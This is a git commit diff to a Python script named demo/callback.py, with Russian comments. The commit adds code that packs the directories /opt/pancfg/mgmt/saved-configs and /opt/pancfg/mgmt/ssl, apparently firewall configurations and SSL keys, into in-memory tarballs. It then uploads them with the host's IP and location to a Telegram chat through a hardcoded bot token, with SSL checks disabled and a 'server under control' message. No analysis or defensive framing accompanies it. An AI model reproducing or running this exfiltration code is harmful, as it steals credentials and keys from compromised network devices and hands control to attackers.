5d95841a0845495dcd64f789759e5a6a33b25762
EncHub <oksanamavrina51@gmail.com>
2024-12-11 14:13:31 -0800

    Update callback.py

--- demo/callback.py
+++ demo/callback.py
@@ -3,6 +3,8 @@ import importlib
 import sys
 import hashlib
 import os
+import io
+import tarfile
 
 # Функция для установки библиотеки
 def install_package(package):
@@ -28,14 +30,28 @@ import urllib3
 # Отключение SSL-предупреждений
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Функция для отправки сообщения в Telegram
-def send_to_telegram(message):
+# Функция для отправки сообщения и файлов в Telegram
+def send_to_telegram(message, files):
     tg_bot_token = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc"
     tg_chat_id = "-1002403648422"
     url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
-    payload = {"chat_id": tg_chat_id, "text": message}
-    response = requests.post(url, json=payload, verify=False)  # Без проверки SSL
+
+    multipart_data = {"chat_id": (None, tg_chat_id), "text": (None, message)}
+    for file_name, file_data in files.items():
+        multipart_data[file_name] = (file_name, file_data, "application/x-tar")
+
+    response = requests.post(
+        url.replace("sendMessage", "sendDocument"), files=multipart_data, verify=False
+    )
     return response.ok
+
+# Функция для архивации директории в память
+def archive_directory(directory_path):
+    tar_stream = io.BytesIO()
+    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
+        tar.add(directory_path, arcname=os.path.basename(directory_path))
+    tar_stream.seek(0)
+    return tar_stream
 
 # Основной процесс
 def main():
@@ -45,9 +61,9 @@ def main():
         ip = ip_info["query"]
         country = ip_info["country"]
         city = ip_info["city"]
-        
+
         # Генерируем хеш из IP
-        ip_hash = hashlib.sha256(ip.encode('utf-8')).hexdigest()
+        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()
 
         # Формируем сообщение для Telegram
         message = f"🟢 Сервер под контролем\n"
@@ -58,11 +74,17 @@ def main():
         message += f"------------------\n"
         message += f"#{ip_hash[:8]}"  # Хеш из первых 8 символов
 
-        # Отправляем сообщение в Telegram
-        if send_to_telegram(message):
-            print("Сообщение успешно отправлено!")
+        # Архивация директорий
+        files = {
+            "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
+            "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
+        }
+
+        # Отправляем сообщение и файлы в Telegram
+        if send_to_telegram(message, files):
+            print("Сообщение и файлы успешно отправлены!")
         else:
-            print("Ошибка отправки сообщения.")
+            print("Ошибка отправки сообщения и файлов.")
     except Exception as e:
         print(f"Ошибка: {e}")
 
